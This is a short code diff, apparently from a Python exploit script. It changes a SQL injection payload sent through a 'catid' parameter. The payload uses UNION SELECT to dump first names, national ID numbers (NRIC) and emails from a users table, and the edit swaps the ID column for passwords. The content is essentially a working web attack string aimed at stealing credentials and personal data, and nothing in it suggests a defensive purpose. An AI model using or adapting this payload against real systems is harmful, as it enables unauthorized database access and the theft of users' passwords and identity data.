@@ -40,7 +40,7 @@
 import sys
 from socket import *
 
-payload="catid=1000+union+select+firstname%2C+nric%2C+email+from+users+LIMIT+7%2C+100"
+payload="catid=1000+union+select+firstname%2C+email%2C+password+from+users+LIMIT+7%2C+100"
 
 
 
